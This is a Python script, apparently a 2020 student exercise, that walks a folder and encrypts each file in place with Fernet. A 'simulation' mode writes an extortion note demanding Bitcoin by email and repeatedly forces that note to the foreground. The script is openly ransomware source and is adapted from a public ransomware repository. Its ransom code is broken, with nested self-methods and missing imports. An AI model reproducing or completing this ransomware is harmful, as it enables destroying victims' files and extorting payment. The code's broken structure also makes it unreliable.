#!/usr/bin/env python3
###########################
# Title: OpsChallenge02
# Author:Jeff Snyder
# Date: 18OCT2020
# Purpose:Encrypt/Decrypt a Folder Recursively added ransomware notes
###########################


import os
from cryptography.fernet import Fernet
import smtplib
import ctypes
import win32gui
import urllib.request
import subprocess
import threading

def generate_key():
    """
    Generates a key and save it into a file
    """
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    """
    Load the previously generated key
    """
    return open("secret.key", "rb").read()

def folderEncrypt(fileLocation):
        path = fileLocation
        files = []

    # r=root, d=directories, f = files
        for r, d, f in os.walk(path):
                for file in f:
                        files.append(os.path.join(r, file))

        for f in files:
                print(f)
                encrypt(f)

def folderDecrypt(fileLocation):
        path = fileLocation
        files = []

    # r=root, d=directories, f = files
        for r, d, f in os.walk(path):
                for file in f:
                        files.append(os.path.join(r, file))

        for f in files:
                print(f)
                decrypt(f)

def encrypt(fileLocation):
    key = load_key()
    """
    Given a fileLocation (str) and key (bytes), it encrypts the file and write it
    """
    f = Fernet(key)
    with open(fileLocation, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(fileLocation, "wb") as file:
        file.write(encrypted_data)

        
def decrypt(fileLocation): 
    """
    Given a fileLocation (str) and key (bytes), it decrypts the file and write it
    """
    key = load_key()
    f = Fernet(key)
    with open(fileLocation, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    decrypted_data = f.decrypt(encrypted_data)
    # write the original file
    with open(fileLocation, "wb") as file:
        file.write(decrypted_data)

def ransomware():
    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
    with open('RANSOM_NOTE.txt', 'w') as f:
        f.write(f'''
The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!
To purchase your key and restore your data, please follow these three easy steps:
1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com
2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.
3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.
WARNING:
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
''')
    def show_ransom_note(self):
        # Open the ransom note
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0 # Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing') # Debugging/Testing
                pass
            else:
                print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
                # Kill ransom note so we can open it agian and make sure ransom note is in ForeGround (top of all windows)
                time.sleep(0.1)
                ransom.kill()
                # Open the ransom note
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            # sleep for 10 seconds
            time.sleep(10)
            count +=1 
            if count == 5:
                break

         # Decrypts system when text file with un-encrypted key in it is placed on dekstop of target machine

    # def put_me_on_desktop(self):
    #     # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
    #     # -the files
    #     print('started') # Debugging/Testing
    #     while True:
    #         try:
    #             print('trying') # Debugging/Testing
    #             # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
    #             # -key in this file and sends it in a email to victim. They then put this on the desktop and it will be-
    #             # -used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASSYEMTRIC KEY etc.
    #             with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
    #                 self.key = f.read()
    #                 self.crypter = Fernet(self.key)
    #                 # Decrpyt system once have file is found and we have cryptor with the correct key
    #                 self.crypt_system(encrypted=True)
    #                 print('decrypted') # Debugging/Testing
    #                 break
    #         except Exception as e:
    #             print(e) # Debugging/Testing
    #             pass
    #         time.sleep(10) # Debugging/Testing check for file on desktop ever 10 seconds
    #         print('Checking for PUT_ME_ON_DESKTOP.txt') # Debugging/Testing
    #         # Would use below code in real life etc... above 10secs is just to "show" concept
    #         # Sleep ~ 3 mins
    #         # secs = 60
    #         # mins = 3
    #         # time.sleep((mins*secs))



def main():
    print("1. Encrypt a folder \n2. Decrypt a folder")
    mode=input("Which mode would you like to run? Choose 1-3:  ")
    print("mode is:", mode)
    if mode== "1":
        generate_key()
        print("You have chosen 1")
        fileLocation=input("You have chosen mode 1.  \nPlease type the location of the folder you would like to encrypt:  ")
        folderEncrypt(fileLocation)
    elif mode== "2":
        print("You have chosen mode 2")
        fileLocation=input("You have chosen mode 2.  \nPlease type the location of the folder you would like to decrypt:  ")
        folderDecrypt(fileLocation)
    elif mode== "3":
        print("You have chosen mode 3 which is a simulation. Use mode 2 to unencrypt")
        fileLocation=input("Enter the file location.")
        folderEncrypt(fileLocation)
        ransomware()

main()

# with help from "https://github.com/ncorbuk/Python-Ransomware/blob/master/RansomWare.py"
# help from https://devqa.io/encrypt-decrypt-data-python/
# help from https://www.thepythoncode.com/article/encrypt-decrypt-files-symmetric-python